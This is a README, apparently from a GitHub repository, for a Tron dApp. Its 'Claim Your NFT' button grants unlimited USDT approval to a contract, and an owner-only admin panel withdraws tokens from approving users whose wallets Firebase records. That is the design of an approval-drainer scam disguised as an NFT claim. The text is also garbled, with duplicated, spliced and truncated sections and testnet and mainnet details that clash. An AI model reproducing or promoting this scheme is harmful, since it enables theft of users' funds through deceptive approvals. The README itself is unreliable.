\# TRC20 Token Claim DApp

A complete Tron blockchain implementation featuring TRC20 token approval and NFT claiming with multi-wallet support (TronLink & WalletConnect).

## 📁 Project Structure

```
TRC20/
├── bored/                # Smart contract development
│   ├── contracts/        # Solidity contracts for Tron
│   ├── scripts/          # Deployment scripts
│   ├── hardhat.config.ts # Hardhat config for Tron
│   └── package.json
│
└── frontend/             # Next.js web application
    ├── app/              # Next.js 14 app directory
    ├── components/       # React components (TronLink + WC)
    ├── lib/              # Contract ABI & Tron utilities
    └── package.json
```

## 🚀 Quick Start

### 1. Deploy Smart Contract to Tron

```bash
cd bored
npm install
npm run compile
npm run deploy:tron  # Deploy to Shasta testnet
```

**Deployed Contract Address:** `TFNYX42UFi8CLzsQ4Wc9vXUJV48kTmXAE5` (Shasta)  
**Token Address:** `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` (USDT on Shasta)

### 2. Setup Frontend

```bash
cd ../frontend
npm install
```

**Configure Environment:**
Create `.env.local`:
```env
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=your_project_id
NEXT_PUBLIC_FIREBASE_API_KEY=your_firebase_key
# ... other Firebase config
```

**Update Contract Address:**
## 📋 Features

### User Features
- **Multi-Wallet Support**: TronLink (desktop/mobile) & WalletConnect (TrustWallet, mobile wallets)
- **Smart Connection**: Auto-detects TronLink mobile app, shows menu for other browsers
- **Claim NFT**: One-click USDT approval and NFT claim process
- **Real-time Balance**: View USDT balance and approval status
- **Transaction Notifications**: Toast notifications for all blockchain interactions
- **Mobile Optimized**: Responsive design with mobile-first approach

### Admin Features
- **Owner Verification**: Automatic owner detection with hex-to-base58 conversion
- **Pull Tokens**: Withdraw USDT tokens from approved users
- **Allowance Checking**: Verify user approvals before pulling (6 decimals TRC20)
- **Firebase Integration**: Track connected wallets in real-time
- **Form Validation**: Input validation and error handlingl
- **Real-time Balance**: View token balance and approval status
- **Transaction Notifications**: Toast notifications for all actions

### Admin Features
- **Owner Verification**: Automatic owner detection
- **Pull Tokens**: Withdraw tokens from approved users
- **Allowance Checking**: Verify user approvals before pulling
- **Form Validation**: Input validation and error handling

## 📚 Complete Documentation

This project includes comprehensive documentation:

- **[PROJECT_SUMMARY.md](PROJECT_SUMMARY.md)** - Complete project overview
- **[SETUP_GUIDE.md](SETUP_GUIDE.md)** - Step-by-step setup instructions
- **[QUICK_REFERENCE.md](QUICK_REFERENCE.md)** - Quick command reference
- **[ARCHITECTURE.md](ARCHITECTURE.md)** - System architecture diagrams
- **[DEPLOYMENT_CHECKLIST.md](DEPLOYMENT_CHECKLIST.md)** - Pre-deployment validation
- **[DOCUMENTATION_INDEX.md](DOCUMENTATION_INDEX.md)** - Documentation navigator
- **[FILE_TREE.md](FILE_TREE.md)** - Complete file structure
- **[PROJECT_COMPLETE.md](PROJECT_COMPLETE.md)** - Project completion status
## 🔧 Smart Contract Functions

### `approveUnlimited()`
Allows users to grant unlimited TRC20 token approval to the contract in one transaction.

```solidity
function approveUnlimited() external returns (bool)
```

**Note:** Works with TRC20 tokens (6 decimals on Tron USDT)

### `pullTokensFromUser(address user, uint256 amount)`
Owner-only function to pull TRC20 tokens from users who have approved the contract.

```solidity
function pullTokensFromUser(address user, uint256 amount) external
```

**Usage:** Amount should be in TRC20 units (e.g., 1000000 = 1 USDT with 6 decimals)

### `changeOwner(address newOwner)`
Transfer ownership to a new Tron address.

## 🛠️ Technology Stack

### Smart Contract
- Solidity ^0.8.28
- Hardhat 3.0.16 (Tron Network)
- TronBox compatibility

### Frontend
- Next.js 14.1.0 (App Router)
- React 18
- TypeScript
- TronWeb 6.1.0 (Tron blockchain interaction)
- TronLink Wallet (Desktop & Mobile)
- WalletConnect v2 (Mobile wallet support)
  - @walletconnect/universal-provider
  - @walletconnect/modal
- Firebase Firestore (Wallet tracking)
- Shadcn UI (Component Library)
- TailwindCSS (Styling)
- Vercel (Deployment)nvironment
## 📝 Environment Variables

### Smart Contract (`bored/.env`)
```env
PRIVATE_KEY=your_tron_private_key_here
```

### Frontend (`frontend/.env.local`)
```env
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=793e977c33e0184a218662828916bc3d
NEXT_PUBLIC_FIREBASE_API_KEY=your_firebase_api_key
NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN=your_project.firebaseapp.com
NEXT_PUBLIC_FIREBASE_PROJECT_ID=your_project_id
NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET=your_project.firebasestorage.app
## 🌐 Deployment

### Deploy to Tron Shasta Testnet

1. Configure `.env` in `bored` directory with your Tron private key
2. Get Shasta TRX from faucet: https://shasta.tronex.io/
3. Deploy:
```bash
cd bored
npm run deploy:tron
```

**Deployed Address:** `TFNYX42UFi8CLzsQ4Wc9vXUJV48kTmXAE5`

### Deploy Frontend to Vercel

```bash
cd frontend
npm run build
vercel --prod
```

**Production URL:** https://frontend-pwnr0r4u2-icodes001-9127s-projects.vercel.app

### Configure Firebase
## 🔍 Testing the Application

### Desktop Testing (TronLink Extension)
1. Install TronLink browser extension
2. Switch to Shasta Testnet
3. Visit the DApp URL
4. Click "Connect Wallet" → Select "TronLink"
5. Approve connection in TronLink
6. Click "Claim Your NFT" at the bottom
7. Confirm transaction in TronLink

### Mobile Testing (TronLink App)
1. Install TronLink mobile app
2. Switch to Shasta Testnet
3. Open DApp URL in TronLink browser
4. App auto-detects and connects TronLink
5. Click "Claim Your NFT"
6. Confirm transaction

### Mobile Testing (WalletConnect - TrustWallet)
## 📖 Pages

- `/` - Main user page for NFT claiming (includes USDT approval)
- `/admin` - Admin panel for pulling tokens from users (owner only)
5. Choose TrustWallet from wallet list
## 🎨 Components

### Core Components
- `TronProvider.tsx` - Tron wallet context provider (TronLink + WalletConnect)
- `TronConnectButton.tsx` - Multi-wallet connection button with smart detection
- `ClaimButton.tsx` - Fixed footer NFT claim button
- `WalletTracker.tsx` - Firebase integration for tracking connected wallets
- `AdminPullPanel.tsx` - Admin control panel for token management
- `ApproveUnlimited.tsx` - Legacy approval interface

### UI Components (Shadcn)
- `ui/button.tsx` - Button component
- `ui/card.tsx` - Card component
## ⚠️ Security Considerations

- **Unlimited Approval Risk**: Users grant unlimited TRC20 token approval - only use with trusted contracts
- **Owner Privileges**: Contract owner has complete control over approved tokens
- **Testnet First**: Currently deployed on Shasta testnet - audit thoroughly before mainnet
- **Address Format**: Tron uses base58 addresses (starts with 'T'), contract internally converts to/from hex
- **Decimal Precision**: USDT on Tron uses 6 decimals (1 USDT = 1000000 units)
- **WalletConnect Security**: Keep your WalletConnect Project ID secure
- **Firebase Rules**: Ensure proper Firestore security rules are deployed
- **Smart Contract Audit**: Audit contract code before production deploymentonfiguration
- `lib/firebase.ts` - Firebase Firestore configuration
- `lib/contract.ts` - Contract addresses and configurationns
4. Specify amount (in TRC20 units with 6 decimals)
5. Click "Pull Tokens"
6. Confirm transaction
### Deploy Frontend

```bash
cd frontend
npm run build
npm start
## 🌐 Network Information

- **Network**: Tron Shasta Testnet
- **Contract**: `TFNYX42UFi8CLzsQ4Wc9vXUJV48kTmXAE5`
- **Token (USDT)**: `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`
- **Owner**: `TWFHL62b5BvvvtBnukg1TH8S5ht38q5PKi`
- **Chain ID**: `0x2b6653dc` (Tron Mainnet for WalletConnect)
- **Faucet**: https://shasta.tronex.io/
- **Explorer**: https://shasta.tronscan.org/

## 📞 Support

For issues and questions:
- Check Tron network status
- Verify wallet is on Shasta testnet
- Ensure sufficient TRX for gas fees
- Check TronScan for transaction details
- Verify all environment variables are set
- Test with TronLink first before WalletConnect

## 🔗 Links

- **Production DApp**: https://frontend-pwnr0r4u2-icodes001-9127s-projects.vercel.app
- **Contract on TronScan**: https://shasta.tronscan.org/#/contract/TFNYX42UFi8CLzsQ4Wc9vXUJV48kTmXAE5
- **TronLink**: https://www.tronlink.org/
- **WalletConnect**: https://walletconnect.com/
- **GitHub**: https://github.com/TYDev01/TRC_20_Claim

---

Built with ❤️ using Tron, TronWeb, Next.js, WalletConnect v2, Firebase, and Shadcn UIr allowance status

2. **As an Admin:**
   - Navigate to `/admin`
   - Connect with the owner wallet
   - Enter a user address that has approved
   - Specify amount and pull tokens

## 📖 Pages

- `/` - Main user page for token approval
- `/admin` - Admin panel for pulling tokens (owner only)

## 🎨 Components

- `ApproveUnlimited.tsx` - User approval interface
- `AdminPullPanel.tsx` - Admin control panel
- `ui/button.tsx` - Shadcn button component
- `ui/card.tsx` - Shadcn card component
- `ui/input.tsx` - Shadcn input component
- `ui/toast.tsx` - Toast notification system

## ⚠️ Security Considerations

- Only grant approval to trusted contracts
- Owner has complete control over approved tokens
- Use on testnet first before mainnet deployment
- Consider implementing timelock for withdrawals
- Audit smart contracts before production use

## 📄 License

MIT License - See individual files for details

## 🤝 Contributing

Contributions welcome! Please follow standard Git workflow:
1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Create a Pull Request

## 📞 Support

For issues and questions:
- Check the documentation
- Review contract code
- Test on local network first
- Verify all environment variables are set

---

Built with ❤️ using Hardhat, Next.js, Wagmi, Viem, and Shadcn UI
# NFT_Claim
# TRC_20_Claim
# The-App
